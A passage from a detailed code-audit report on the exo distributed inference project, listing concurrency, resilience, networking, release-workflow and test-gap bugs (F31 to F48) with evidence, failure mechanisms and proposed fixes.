**Mechanism.** Push a `v*` tag (or run workflow_dispatch): after ~10 minutes of setup, keychain import and credential validation, the "Build PyInstaller bundle" step exits with `Module 'mlx' is not available in the current environment.` No DMG, no appcast, no GitHub release. Because `uv run` re-syncs to the same default (no extras), even a manual `uv sync --extra mlx` inserted earlier would be undone at :328 unless `--no-sync`/`--extra mlx` is passed there too. Nothing in pipeline.yml exercises the spec, so the breakage is only discovered at release time.

**Fix.** Change :172 to `uv sync --locked --extra mlx` and :328 to `uv run --no-sync pyinstaller packaging/pyinstaller/exo.spec` (or `uv run --extra mlx ...`), matching the `justfile` `sync`/`package` recipes. Add a PR-time smoke job (macOS) that runs `just package` so the PyInstaller path is validated before a tag is pushed.

### F32 — Late joiners replay the entire session history 1000 events per round, each round gated on unrelated live traffic and broadcast to every node

*`src/exo/routing/event_router.py:141` — high · effort L · merged into F26 · lens `control-plane` · confidence 0.80*

Duplicate of F26, kept for readers arriving from the `control-plane` lens.

**Evidence.** event_router.py:117 `buf = OrderedBuffer[Event]()` starts at `next_idx_to_release = 0` (event_buffer.py:14) regardless of the session's current head; `_nack_request` is only started from inside the inbound `async for` when an event fails to drain (lines 136-142) — no timer re-arms it. master/main.py:454-464 serves `RequestEventLog` with `end = min(command.since_idx + 1000, len(self._event_log))` and replays via `_send_indexed_event` -&gt; `global_event_sender` on GLOBAL_EVENTS, which is `PublishPolicy.Always` (topics.py:40), i.e. broadcast to all nodes. info_gatherer.py:444-456 emits `NodeGatheredInfo` at 1 Hz per macOS node (`_monitor_macmon, 1`) plus 5/10/30/60 s pollers, so a 4-node cluster produces roughly 350k indexed events per day.

**Mechanism.** A node joining (or rejoining after its EventRouter was rebuilt by an election) a cluster that has been up for a day needs ~350 nack rounds; each round waits for the next live out-of-order event plus the 0.5 s nack delay, and pushes ~1000 JSON-serialised events (MacmonMetrics payloads are KBs each) to every node, which drop them. Join time is minutes, the LAN carries hundreds of MB of useless replay, `DiskEventLog._seek_to` re-scans when the 128-entry offset cache thrashes, and during the whole catch-up the joiner's Worker plans against an empty replica and its API reports an empty cluster.

**Fix.** Add a snapshot path: when `since_idx == 0` (or the gap exceeds a threshold) the master responds with a `StateSnapshot(idx, state)` event that `apply` handles by replacing `State` and setting `last_event_applied_idx = idx`, so joiners start at the head. Send replays unicast on a per-requester key (e.g. `global_events/<system_id>`), or carry the requester's SystemId so non-requesters ignore the batch. In `EventRouter`, re-arm `_nack_request` on a timer while `buf.store` is non-empty instead of waiting for the next inbound event.

### F33 — API asserts ChunkGenerated for image commands is an ImageChunk, so the supervisor's crash ErrorChunk (and any image-engine ErrorChunk) crashes the whole node

*`src/exo/api/main.py:1980` — high · effort S · verified · lens `worker-runner` · confidence 0.80*

**Evidence.** api/main.py:1976-1984: `if queue := self._image_generation_queues.get(event.command_id, None): assert isinstance(event.chunk, ImageChunk)`. The producers deliberately send non-ImageChunks on this path: supervisor.py:408-423 `for task in self.in_progress.values(): if isinstance(task, (TextGeneration, ImageGeneration, ImageEdits)): ... ChunkGenerated(command_id=task.command_id, chunk=ErrorChunk(...))`, and engines/image/builder.py:205-215 yields `ErrorChunk(model=..., finish_reason="error", error_message=str(e))` on any generation exception, forwarded by runner.py:353/388-394 `send_chunk`. The image consumer at api/main.py:1118-1128 is written to handle `chunk.finish_reason == "error"` and the queue is typed `channel[ImageChunk | ErrorChunk]` (1112-1114), but the assert fires before it. `_apply_state` runs as a task in `API.run`'s group (api/main.py:1916) with no handler; `Node.run` (main.py:157-170) has none; `main_inner` (main.py:368-372) logs 'EXO terminated due to unhandled exception' and exits.

**Mechanism.** An image runner dies mid-request (Metal timeout, OOM, ring error) or mflux raises during a generation. The rank-0 supervisor or ImageEngine emits ChunkGenerated(ErrorChunk) for the open command; on the node whose API owns that stream, `_apply_state` raises AssertionError, the API task group fails, the exception propagates to the Node task group, and the entire exo process exits — killing every healthy LLM runner on that node too. The client sees a dropped connection instead of the 500 error JSON the consumer was written to send.

**Fix.** Replace the assert with a narrowing check that forwards `ImageChunk | ErrorChunk` (the queue's declared type) and logs-and-drops anything else, mirroring the text branch; add a unit test that pushes `ChunkGenerated(chunk=ErrorChunk(...))` for a registered image command through `_apply_state` and asserts the stream yields the error response.

### F34 — API.reset drops the generation-queue dicts without closing the senders, so every request in flight during a master change hangs forever behind SSE keep-alives

*`src/exo/api/main.py:304` — high · effort S · verified · lens `resilience` · confidence 0.80*

**Evidence.** api/main.py:298-310 `reset`: `self._text_generation_queues = {}` and `self._image_generation_queues = {}` (:304-305) — no `close()` on the existing senders. Contrast the shutdown path :1925-1929 which does `self._shutdown_queues(self._text_generation_queues)` / `..._image_generation_queues` before stopping. Each active request sits in `_token_chunk_stream` :766-773 `with recv as token_chunks: async for chunk in token_chunks:` (and the image equivalents :1114-1116, :1230-1232) waiting on the receive side of exactly those orphaned senders. The response is wrapped by `with_sse_keepalive` (keepalive.py:24-29) which yields `: keep-alive` every 10 s forever, so the HTTP connection never idles out. anyio 4.11's `MemoryObjectSendStream.__del__` (.venv anyio/streams/memory.py:312-316) only emits a ResourceWarning; it never closes the stream. `reset` is invoked from main.py:271 on every `is_new_master` result, at which point main.py:256-269 has already torn down the worker (and its runners), so no chunk will ever arrive.

**Mechanism.** Master node dies (or a `--force-master` node joins, or a partition heals) while clients are streaming. The election result triggers `api.reset`. Every open chat/image request on every API node keeps its TCP connection open, receives `: keep-alive` every 10 s and no data, and never terminates; SDK clients with default no-timeout streaming (OpenAI/Anthropic SDKs) wait indefinitely. Nothing is logged for those requests.

**Fix.** In `reset`, before replacing the dicts, iterate the existing senders and push a terminal `ErrorChunk(model=..., error_message="cluster master changed; request aborted", finish_reason="error")` (the adapters already turn that into a 500 + `[DONE]`), then `close()` each sender — i.e. reuse `_shutdown_queues` but with an error chunk first. That gives clients an immediate, explicit failure instead of an unbounded hang.

### F35 — RunnerSupervisor.start_task waits for the runner's ack with no timeout, so a runner hung in a collective (peer host lost) freezes the whole worker planner

*`src/exo/worker/runner/supervisor.py:299` — high · effort M · verified · lens `resilience` · confidence 0.75*

**Evidence.** supervisor.py:278-299 `start_task`: `await self._task_sender.send_async(task)` then `await event.wait()` with no bound. The ack only arrives from the runner main thread: runner.py:344 `results = self.generator.step()` then :371-374 `case TextGeneration()|...: self.acknowledge_task(item)` — i.e. after the current step returns. worker/main.py:193-227 `plan_step` is one sequential loop that `await self._start_runner_task(task)` (:366-367, :373-377); only `Shutdown` is bounded (`with fail_after(3)` :284). `_watch_runner` :357-362 only checks `self.runner_process.is_alive()`. The intended bounds exist but are never read: `PREFILL_TIMEOUT_SECONDS = 60` / `DECODE_TIMEOUT_SECONDS = 5` (:57-58) and `initialize_timeout: float` (:187, default 400 at :208) — a repo-wide grep finds only their definitions and one test constructor. The only escape is `_forward_events`'s `finally: for tid in self.pending: self.pending[tid].set()` (:353-355), which runs only once the process dies.

**Mechanism.** Two-node instance; node B's machine loses power or its link drops. A's runner blocks inside the ring/JACCL collective in `step()` (TCP with a vanished peer stalls for minutes, not milliseconds). The master still routes new requests to the instance (its state says Ready/Running), the worker dispatches the next TextGeneration to A's runner, `start_task` blocks on the ack that never comes, and `plan_step` stops ticking. From then on that node cannot create/load/shut down any runner for any instance — including the `Shutdown` that `_kill_runner` would emit once `InstanceDeleted` arrives — until the runner process happens to die. The user sees every request to that node hang behind SSE keep-alives, and the dashboard shows the node alive and its runner "Running" indefinitely.

**Fix.** Bound the ack wait in `start_task` (e.g. `with fail_after(ack_timeout)` around `event.wait()`, ack_timeout derived from the unused `initialize_timeout` for lifecycle tasks and `DECODE_TIMEOUT_SECONDS`/`PREFILL_TIMEOUT_SECONDS` for generation tasks); on timeout call `_check_runner(TimeoutError("runner did not acknowledge task"))`, which already kills the process, emits `ErrorChunk`s for in-flight commands and reports `RunnerFailed`. Alternatively make `_watch_runner` a progress watchdog: track the time of the last event received from the runner while `in_progress` is non-empty and fail the runner when it exceeds the decode timeout. Either change restores the invariant that `plan_step` never blocks on a runner for more than a bounded time.

### F36 — Subscriber callback drops inbound messages silently when the 1024-slot to_topics channel is full

*`rust/networking/src/swarm.rs:174` — high · effort S · verified · lens `rust-transport` · confidence 0.75*

**Evidence.** swarm.rs:56 creates one channel for every topic: `let (mut to_topics, mut from_topics) = mpsc::channel(1024);`. The per-topic subscriber callback (swarm.rs:167-178) does `_ = sender.try_send(FromSwarm::Message { topic: topic.clone(), data: ... })` and discards the Err(Full) result with no log or counter. The publisher side is declared with `.congestion_control(CongestionControl::Block)` (swarm.rs:154), so the wire is lossless but the last hop into Python is not. The Python drain is router.py:186-200 (`from_swarm = await self._net.recv()` then `await router.publish_bytes(data)`, which pydantic-deserialises each message on the event loop). master/main.py:454-464 replays up to 1000 events in one burst per `RequestEventLog`.

**Mechanism.** Whenever the Python event loop falls more than 1024 zenoh samples behind (a nack-triggered 1000-event replay plus live traffic, a large State deserialisation, any GIL-bound work on the main thread), samples are dropped without trace. COMMANDS and DOWNLOAD_COMMANDS have no retransmit path (TopicRouter._send_out at router.py:92-96 just sends), so a user's PlaceInstance/DeleteInstance or a RequestEventLog silently vanishes. LOCAL_EVENTS are only recovered by EventRouter._simple_retry after &gt;5 s (event_router.py:77-84), so a worker's status stream stalls for seconds. GLOBAL_EVENTS gaps trigger nack replays that themselves are 1000-event bursts, which can re-overflow the channel.

**Fix.** Replace the callback + try_send with zenoh's blocking FIFO handler so backpressure propagates to the transport instead of losing data: `session.declare_subscriber(key).allowed_origin(Locality::Remote).with(FifoChannel::new(1024)).await` and drive it with `recv_async()` inside the select loop (or forward into an unbounded channel). At minimum, match on `TrySendError::Full`, log at warn and increment a drop counter surfaced to Python.

### F37 — Disaggregated prefill leaves the decode cache 2 tokens short, and drops the prefix-cached region when start_pos &gt; 0

*`src/exo/worker/engines/mlx/disaggregated/serve.py:44` — high · effort M · verified · lens `mlx-engine` · confidence 0.70*

**Evidence.** Both callers send only the uncached suffix: generate.py:651-659 `remote_prefill(prompt_tokens[:-1], caches, ..., start_pos=prefix_hit_length)` where `prompt_tokens` is the remainder returned by `get_kv_cache` (588-593); same at batch_generate.py:218-226. remote_prefill.py:48-53 puts those tokens in `PrefillRequest(token_ids=..., start_pos=start_pos)`. The server treats them as the whole prompt: serve.py:28 `prompt_tokens = mx.array(request.token_ids)`, 44-58 `target_offset = max(0, n_tokens - 2)` then `mlx_prefill(prompt_tokens=prefill_input)`; but `prefill()` leaves `len(input) - 1` tokens (generate.py:375-387 `c.trim(2)` after stream_generate added one; asserted by test_kv_prefix_cache.py:159 `assert cache_length(cache) == len(tokens) - 1`). adapter.py:114-118 then ships `keys[:, :, start_pos:offset]`, i.e. slices the *suffix's* cache from the client's prefix length. The protocol test (disaggregated/tests/test_end_to_end.py:140-158) uses `token_ids=list(range(seq_len))` (full prompt) with a gold cache of the full sequence, confirming the intended semantics.

**Mechanism.** With `prefix_hit_length == 0` and M remaining tokens: client sends M-1 ids; server prefills M-3 and returns a cache of M-4 positions; client sets offset M-4 (client.py:116, 131-142) and then decodes on `prompt_tokens[-2:]` at positions M-4, M-3 — the two prompt tokens before the last two (typically `<|im_end|>\n`) never enter the cache and the last two get wrong RoPE positions. With a local prefix hit P &gt; 0 the server additionally discards the first P entries of the suffix's KV (or sends nothing when P &gt;= offset), so the assembled cache is missing P further tokens. Output is silently degraded/wrong whenever `prefill_endpoint` is set and the uncached prompt exceeds REMOTE_PREFILL_MIN_TOKENS.

**Fix.** Define one contract and enforce it on both ends: send `all_prompt_tokens[:-1]` (full prompt) as `token_ids` with `start_pos=prefix_hit_length`, let the server prefill positions [0, len) using its own prefix cache, and ship [start_pos, len). Fix the server's target so the returned cache holds exactly `len(token_ids) - 1` positions (account for `prefill()`'s L-1 post-condition, e.g. `prefill(remaining)` with no `- 2`), and have the client assert `final_offset == start_pos + len(suffix) - 1` before proceeding (fall back to local prefill otherwise). Add an end-to-end test that runs `run_prefill_for_request` + `remote_prefill` against `mlx_generate`'s local path and compares `cache_length` and logits.

### F38 — Disaggregated prefill on a multi-rank instance runs mx_barrier/all_gather on rank 0 only, deadlocking the runner on the first request

*`src/exo/worker/engines/mlx/disaggregated/serve.py:49` — high · effort M · verified · lens `concurrency` · confidence 0.70*

**Evidence.** runner.py:128-135 `_start_prefill_server`: `if self.device_rank != 0: return None` -&gt; only rank 0 hosts the PrefillServer and enqueues `PrefillTask`s (136-143). runner.py:179-189 `_serve_prefill` -&gt; batch_generator.py:558-572 `serve_prefill` -&gt; serve.py:49-58 `mlx_prefill(..., group=group, ...)` -&gt; generate.py:282-330 `prefill(...)` which executes `mx_barrier(group)` at generate.py:329 (utils_mlx.py:843-850 `mx.distributed.all_sum`), followed by the sharded forward pass with its own collectives. serve.py:36-39 also calls `kv_prefix_cache.get_kv_cache` whose eviction path cache.py:429-470 does `mx.distributed.all_gather`.

**Mechanism.** With `ENABLE_DISAGGREGATION` on and a prefill instance spanning 2+ nodes, the first decode-side request hits rank 0's PrefillServer; rank 0 enters `mx_barrier(group)` while ranks 1..n are blocked in `Runner.main` on `_work_queue.get()` and never issue the matching collective. Rank 0 hangs forever (alive, so no supervisor detection), the HTTP client waits out `PREFILL_FINISH_TIMEOUT_SECONDS` (300 s), and every subsequent generation task queued to rank 0 is stuck behind the wedged main thread.

**Fix.** Either restrict prefill-server placement to `world_size == 1` instances (refuse `_start_prefill_server` / have the master not link multi-rank prefill instances), or make `PrefillTask` a cross-rank agreed work item: have rank 0 broadcast the request tokens through an agreed collective (same pattern as `mx_all_gather_tasks`) so all ranks execute `run_prefill_for_request` together, and make the idle `main()` loop of non-zero ranks participate (see the previous finding). Add a test in test_serve_prefill.py that runs `serve_prefill` with a fake 2-rank group and asserts no unmatched collective.

### F39 — _token_chunk_stream cleanup runs in a cancelled scope: TaskFinished is dropped on client disconnect and TaskCancelled is dropped when the generator is finalized at a yield

*`src/exo/api/main.py:786` — high · effort S · verified · lens `concurrency` · confidence 0.70*

**Evidence.** api/main.py:757-789: `except anyio.get_cancelled_exc_class(): ... with anyio.CancelScope(shield=True): await self.command_sender.send(TaskCancelled...); raise` then `finally: await self._send(TaskFinished(...)); if command_id in self._text_generation_queues: del ...`. `_send` (api/main.py:2044-2048) is unshielded and calls `self.command_sender.send(...)`; anyio 4.11 (uv.lock:142-143) `MemoryObjectSendStream.send` begins with `await checkpoint()`, which raises inside a cancelled scope. keepalive.py:15-34 pumps the generator through an unbuffered `create_memory_object_stream` from a `_consume` task, so the generator can be suspended at `yield` (not at `receive`) when the surrounding task group is cancelled. No API test covers the disconnect path (grep for TaskFinished/disconnect in src/exo/api/tests is empty).

**Mechanism.** Case 1 (generator suspended in `recv.receive()`): client disconnects -&gt; Starlette cancels the response task -&gt; TaskCancelled is sent (shielded), then `finally` hits the checkpoint in `command_sender.send` and raises CancelledError, so `TaskFinished` is never sent and the `del self._text_generation_queues[...]` line is skipped. The master never emits `TaskDeleted`; `command_task_mapping` (master/main.py:244) and `state.tasks` grow by one Cancelled task per disconnect, forever, replicated to every node and sent as a `CancelTask` to every future runner of that instance (plan.py:350-362). Case 2 (generator suspended at `yield chunk` because `_consume` is blocked in `send.send` while hypercorn writes to a slow socket): `_consume` is cancelled, the abandoned async generator is later finalized with GeneratorExit, the `except CancelledError` branch never runs, and no `TaskCancelled` reaches the master: the runner keeps generating for the disconnected client until max_tokens.

**Fix.** Restructure `_token_chunk_stream` (and the two image equivalents at api/main.py:1112-1207 and 1229-1293) so all teardown happens in one `finally` under `CancelScope(shield=True)`: track `finished: bool`; in `finally`, pop the queue entry, send `TaskCancelled` if not finished, then send `TaskFinished`, using `command_sender.send` directly (not `_send`, which can block on `paused`). This also covers GeneratorExit. Add a test that iterates the stream, cancels the consuming task via a cancel scope, and asserts both commands were sent.

### F40 — Multi-rank runner can block in agree_on_tasks all_gather while the peer rank sits idle, wedging the instance and the node's planner

*`src/exo/worker/runner/runner.py:341` — high · effort M · merged into F35 · lens `concurrency` · confidence 0.60*

Duplicate of F35, kept for readers arriving from the `concurrency` lens.

**Evidence.** runner.py:324-327 `submit_generation` does `self.active_tasks[task.task_id] = task` before any cross-rank agreement; runner.py:341-342 `while self.active_tasks: results = self.generator.step()`; batch_generator.py:405-406 `if not self._queue: self.agree_on_tasks()` -&gt; utils_mlx.py:887-928 `mx.distributed.all_gather(...)` (blocking collective). Idle ranks never step: runner.py:210-211 `item = self._work_queue.get()` blocks in `main()`. The unused watchdog constants supervisor.py:57-58 `PREFILL_TIMEOUT_SECONDS = 60` / `DECODE_TIMEOUT_SECONDS = 5` are referenced nowhere (grep). supervisor.py:294-299 `start_task` awaits the runner ack with no timeout and worker/main.py:373-377 awaits it inline in the single `plan_step` loop (193-207). plan.py:312-313 skips tasks whose status is not Pending/Running.

**Mechanism.** Rank 0 has tasks A and B in `active_tasks` (B arrived while A was running); rank 1 only has A because its worker had not yet dispatched B. A finishes on both ranks in lockstep. Rank 1's `active_tasks` empties, it returns RunnerReady and blocks in `_work_queue.get()`. Rank 0 still has B, calls `step()` -&gt; `agree_on_tasks()` -&gt; `all_gather`, which needs rank 1 to also call `all_gather`. If the client cancels/disconnects B before rank 1 dispatches it (TaskCancelled -&gt; status Cancelled, or TaskFinished -&gt; TaskDeleted), rank 1 never enters `handle_generation_tasks` again and rank 0 hangs forever inside the collective, alive, status RunnerRunning. Nothing detects this: the process is alive so `_watch_runner` is happy and the timeout constants are unused. Worse, rank 0's worker `plan_step` is stuck in `start_task` waiting for an ack that is only sent between steps, so no CancelTask/Shutdown/other-instance task is ever planned on that node until restart.

**Fix.** Make membership in the stepping loop a cross-rank-agreed fact: (1) only add to `Runner.active_tasks` when the engine reports a task as agreed (return agreed ids from `submit`/`agree_on_tasks`), or (2) have idle ranks of a multi-rank instance keep participating: in `Runner.main`, when `world_size > 1`, poll `_work_queue.get(timeout=...)` and call `engine.agree_on_tasks()`/`agree_on_cancellations()` on timeout so a peer's all_gather always completes. Additionally wire the existing `PREFILL_TIMEOUT_SECONDS`/`DECODE_TIMEOUT_SECONDS` into `RunnerSupervisor` (last-event timestamp watchdog in `_watch_runner` that calls `_check_runner`) and give generation-task `start_task` a `fail_after` like the Shutdown path so a hung runner cannot freeze `plan_step` for other instances.

### F41 — API.reset closes the old event receiver while the old _apply_state task is still iterating it; the resulting EventRouterClosedResourceError is uncaught in API.run and takes down the whole node

*`src/exo/api/main.py:307` — high · effort S · verified · lens `resilience` · confidence 0.50*

**Evidence.** api/main.py:298-310 `reset`: `self.event_receiver.close()` (:307) then `self._tg.start_soon(self._apply_state)` (:309) — the previous `_apply_state` task (started at :1915 or a prior reset) is still running `with self.event_receiver as events: async for i_event in events:` (:1966-1968) on that receiver. channels.py:151-180 patches `Receiver.receive`/`receive_nowait` to raise `EventRouterClosedResourceError`. anyio 4.11 (`.venv/.../anyio/streams/memory.py`) `receive()` does `await checkpoint()` then `return self.receive_nowait()`, and `receive_nowait` begins `if self._closed: raise ClosedResourceError` — so any old task that is at that checkpoint, mid-event (e.g. suspended in `await queue.send(event.chunk)` :1978), or that has events still buffered raises on its next iteration. `API.run` :1910-1937 has no `except*` handler, unlike `Worker.run` (worker/main.py:116-118) and `Master.run` (master/main.py:158-160), which both catch `(EventRouterBrokenResourceError, EventRouterClosedResourceError)`. main.py:195-203 cancels the old EventRouter only asynchronously, so buffered events in the API receiver are common when the old master is still alive (partition heal, `--force-master` join, active token streaming).

**Mechanism.** A master change happens while events are flowing (tokens streaming, or a 1000-event NACK replay just landed). The old `_apply_state` resumes, calls `receive()` on the now-closed receiver, raises `EventRouterClosedResourceError`, which propagates through the API TaskGroup into `Node._tg`; `main_inner` logs "EXO terminated due to unhandled exception" and the process exits. The operator sees the API node die exactly when the cluster is already re-electing.

**Fix.** Add `except* (EventRouterBrokenResourceError, EventRouterClosedResourceError): pass` around `API.run`'s task group (mirroring Worker/Master), and in `reset` do not `close()` the old receiver — let the old EventRouter's shutdown close its `internal_outbound` senders so the old `_apply_state` ends via `EndOfStream` cleanly. Add a test that calls `reset` while `_apply_state` has a buffered event and asserts the API task group survives.

### F42 — warmup_inference clamps elapsed time with min() instead of max(), so the cancel-check interval is always 100 tokens

*`src/exo/worker/engines/mlx/generator/generate.py:442` — medium · effort S · verified · lens `mlx-engine` · confidence 0.95*

**Evidence.** generate.py:441-443: `check_for_cancel_every = min(math.ceil(tokens_generated / min(time.monotonic() - t, 0.001)), 100)`. `min(elapsed, 0.001)` caps the denominator at 1 ms, so for any `tokens_generated >= 1` the quotient is &gt;= 1000 and the outer `min(..., 100)` always yields 100. The value is consumed by the runner as the per-task interval between `agree_on_cancellations()` calls (runner/llm_inference/batch_generator.py:274-285, 533-544).

**Mechanism.** The intent is roughly one cancellation check per second (tokens/sec, capped at 100). Instead every runner checks every 100 tokens regardless of throughput; on a large model decoding at 3-8 tok/s a user's cancel (or client disconnect) takes 12-30 s to take effect on every rank, and the distributed all_gather in the warmup (448-456) just propagates the same constant.

**Fix.** Use `max(time.monotonic() - t, 0.001)` as the denominator (and name it, e.g. `elapsed_seconds`). Consider also letting the runner check on a wall-clock basis (e.g. every 0.5 s) rather than a token count so the interval is independent of model speed.

### F43 — --bootstrap-peers / EXO_BOOTSTRAP_PEERS are parsed, validated, then hard-raise after the PID file is acquired

*`src/exo/main.py:353` — medium · effort S · finder-reported · lens `dead-code-drift` · confidence 0.95*

**Evidence.** main.py:458-466 registers `--bootstrap-peers` with `default=os.getenv("EXO_BOOTSTRAP_PEERS", "").split(",") if os.getenv("EXO_BOOTSTRAP_PEERS") else []` and help text 'Comma-separated libp2p multiaddrs to dial on startup'. main.py:352-353: `if args.bootstrap_peers: raise ValueError("Bootstrap peers has been temporarily removed")`. This runs inside `main_inner` after `pidfile.write()` (main.py:315/323) and `logger_setup` (main.py:340), and is outside the `try/except BaseException` at 368-374 that logs 'EXO terminated due to unhandled exception'. TODO.md:1 says 'EXO_BOOTSTRAP_PEERS is currently broken'. No code in rust/ or src/ consumes bootstrap peers (grep for bootstrap_peers hits only main.py).

**Mechanism.** An operator with EXO_BOOTSTRAP_PEERS left in a service unit or shell profile (it was a documented knob) gets a process that prints `pid = N` to the log, then exits with an uncaught ValueError. With --legacy-daemon stdout/stderr are /dev/null (main.py:296-306) so nothing is written anywhere; the daemon simply is not running. `exo --help` still advertises a flag that can never work and names a transport (libp2p) that no longer exists.

**Fix.** Delete the `--bootstrap-peers` argparse entry, the `Args.bootstrap_peers` field, the raise at main.py:352-353, and TODO.md item 1. If a manual-join escape hatch is wanted later, implement it end to end (Rust `connect_peer` already exists in rust/networking/src/lib.rs:97-99) and re-add the flag with zenoh locator syntax rather than shipping a flag that only crashes.

### F44 — Election tie-breaker test is vacuous: it exits on the boot-time clock-0 result before the contested round resolves

*`src/exo/shared/tests/test_election.py:396` — medium · effort S · finder-reported · lens `test-gaps` · confidence 0.95*

**Evidence.** test_election.py:396-400: `while True: result = await er_rx.receive(); if result.session_id.master_node_id == me: assert result.session_id.election_clock in (0, 1); break`. Election.run (election.py:94-98) runs an initial campaign with `campaign_timeout=0.0` that immediately calls `elect()` with our own message, sending an ElectionResult(won_clock=0, master=ME) before the peer message is even injected. Verified with a probe copy of the test where PEER had `commands_seen=5000` vs our 50: the loop exited on `(won_clock=0, 'ME')` and the test still passed. Additionally `_election_status` (election.py:257-260) reuses `current_session` (election_clock 0) whenever we are already master, so filtering on `election_clock == 1` cannot isolate the round either. Related flake: test_ignores_older_messages:196 uses a 0.05 s `move_on_after` window while `_campaign` re-broadcasts the same status after `DEFAULT_ELECTION_TIMEOUT` (0.1 s, election.py:214-216); any &gt;50 ms scheduling delay makes the rebroadcast land in the window and fail the 'no second broadcast' assertion.

**Mechanism.** A regression inverting the `commands_seen` comparison in `ElectionMessage.__lt__` (election.py:33-34) — which decides which node keeps the command history after a partition heals — passes this test unchanged. The zero-timeout boot election also means every test here has a spurious result on the channel that the other tests filter out by hand.

**Fix.** In the tie-breaker test loop on `result.won_clock == 1` (ElectionResult carries `won_clock` for exactly this) and then assert `result.session_id.master_node_id == me`. Add the mirror case (peer has more `commands_seen` -&gt; peer wins, `is_new_master is True`), an `is_candidate=False` case (seniority -1 never wins against a candidate), and an equal-seniority/equal-commands node-id tie. For test_ignores_older_messages, assert on the *content* of any extra message (`got.clock == 2` allowed, `clock == 1` forbidden) instead of 'no message within 50 ms', or widen the window past the rebroadcast.

### F45 — "Ensure tag commit is on main" guard tests the inverse relation (main is ancestor of tag) and passes tags on side branches

*`.github/workflows/build-app.yml:97` — medium · effort S · verified · lens `build-deps` · confidence 0.95*

**Evidence.** build-app.yml:90-100: `elif ! git merge-base --is-ancestor origin/main HEAD; then echo "Production tag must point to a commit on main"; exit 1`. `git merge-base --is-ancestor A B` succeeds when A is an ancestor of B, i.e. this checks that origin/main is contained in HEAD, not that HEAD is contained in origin/main.

**Mechanism.** A `v1.2.3` tag pushed on any feature branch that was branched from (or has merged) the current tip of main passes the check, is signed, notarized, uploaded as `EXO-latest.dmg` and the appcast is overwritten (:541-545), so all users auto-update to unreviewed code. Conversely, re-tagging an older commit that IS on main (hotfix re-release, or main having moved on since the tag was cut) fails with "must point to a commit on main". The guard therefore neither protects releases nor allows legitimate ones.

**Fix.** Use `git merge-base --is-ancestor HEAD origin/main` (HEAD must be reachable from main). Optionally also fetch with `--tags` and reject tags whose object is not `origin/main`'s history via `git branch -r --contains "$GITHUB_SHA" | grep -qx ' *origin/main'`.

### F46 — TracesCollected is consumed by the master without being indexed, so the origin never receives an ack and resends the trace payload every ~6 s forever

*`src/exo/master/main.py:505` — medium · effort S · finder-reported · lens `control-plane` · confidence 0.90*

**Evidence.** master/main.py:503-506: `for event in self._multi_buffer.drain(): if isinstance(event, TracesCollected): await self._handle_traces_collected(event); continue` — this runs before `self._event_log.append(event)` / `_send_indexed_event(indexed)` (521-522), so the event never appears on GLOBAL_EVENTS. event_router.py:126-128 removes an `out_for_delivery` entry only when the same `event_id` comes back on GLOBAL_EVENTS; `_simple_retry` (76-84) resends every entry older than 5 s on a 1-2 s loop. Harness against the real EventRouter: an event that is never echoed was re-sent at t=0.90, 6.45, 12.87 s with no end. Emitter: worker/engines/image/builder.py:73-93, gated by `EXO_TRACING_ENABLED`, payload is the full per-op trace list.

**Mechanism.** With tracing enabled, every image-generation task and rank adds a multi-KB `LocalForwarderEvent` to `out_for_delivery` that is never removed and is re-published on LOCAL_EVENTS for the lifetime of the session. Memory on the worker grows without bound and the LAN carries a constant stream of duplicate trace blobs; the master silently drops them (`idx < next_idx_to_release` in event_buffer.py:19-20), so the only visible symptom is bandwidth and log noise.

**Fix.** Index `TracesCollected` like every other event (event_apply already treats it as pass-through, apply.py:85-93) and perform `_handle_traces_collected` after `_send_indexed_event` inside `_event_processor`; the echo then acks it. Alternatively emit an explicit ack event. Add a master test that sends a TracesCollected through a real EventRouter and asserts `out_for_delivery` becomes empty.

### F47 — Runner hangs forever in main() after consuming _TaskStreamClosed inside the generation loop, so every teardown during a generation ends in SIGTERM after 3 s

*`src/exo/worker/runner/runner.py:362` — medium · effort S · finder-reported · lens `worker-runner` · confidence 0.90*

**Evidence.** runner.py:359-363 inside `handle_generation_tasks`: `item = self._work_queue.get_nowait() ... if isinstance(item, _TaskStreamClosed): return ExitCode.Shutdown`; the caller (300-302) just `return`s; `main()` (221-223) then checks `if isinstance(self.current_status, RunnerShutdown): break` but the status is still `RunnerRunning`, so it loops to `self._work_queue.get()` (211). The reader thread puts the sentinel exactly once (166-174). The supervisor closes the task channel in its finally (supervisor.py:261) and then `_terminate_if_still_alive` joins for 3 s before `process.terminate()` (async_process.py:212-217).

**Mechanism.** Node shutdown, an election change (main.py:257-269 recreates the Worker), or a sibling failure while requests are in flight closes the task stream while the runner is in the generation loop. The runner returns from `handle_first_task` and blocks on an empty queue; it never exits on its own, so each such teardown costs 3 s and logs 'Child process didn't shut down successfully, terminating'. If the parent is already gone (see the orphan finding) the runner blocks forever with the model resident.

**Fix.** Have `handle_first_task` return the `ExitCode` and make `main()` break on `ExitCode.Shutdown` (or set `self.current_status = RunnerShutdown()` before returning at line 363). Add a test that closes `task_sender` while a generation is active and asserts `runner.main()` returns.

### F48 — MpReceiver.receive_nowait checks the shared closed flag before draining the queue, dropping every item queued behind the peer's close() (confirmed 15/15 in isolation)

*`src/exo/utils/channels.py:317` — medium · effort S · verified · lens `worker-runner` · confidence 0.90*

**Evidence.** channels.py:316-318 `if self._state.closed.is_set(): raise ClosedResourceError` precedes `self._state.buffer.get(block=False)`; `receive()` (332-346) always goes through `receive_nowait` first. `MpSender.close()` (274-279) sets `closed` and only then enqueues `_MpEndOfStream`. Reproduction (scratchpad script, spawn context): sender sends 8 ints then `close(); join()`; receiver iterates with a 2 ms delay per item (one async hop in `_forward_events`): 15/15 trials received 1/8 then ClosedResourceError. Production callers: supervisor.py:264-267 `self._cancel_sender.send(CANCEL_ALL_TASKS)` immediately followed by `self._cancel_sender.close()`; batch_generator.py:386 `self.cancel_receiver.collect()` (collect catches only WouldBlock, 400-409) → ClosedResourceError → bootstrap.py:90-91 `except ClosedResourceError` exit 0; bootstrap.py:92-97 `event_sender.send(RunnerTerminationError...)` then `close()` in finally.

**Mechanism.** Any burst of sends followed by close() loses everything the consumer had not already dequeued. Concretely: the teardown CANCEL_ALL_TASKS is never observed as a cancel — the runner instead dies via the ClosedResourceError path or hangs (previous finding); at a runner crash, events queued just before RunnerTerminationError (the `_send_error` ErrorChunk with the real message, the last RunnerStatusUpdated) or the termination error itself can be dropped, so `_check_runner` reports only 'exitcode=1' with no traceback. test_channels.py:48-58 only covers sends spaced 100 ms apart, so the race is untested.

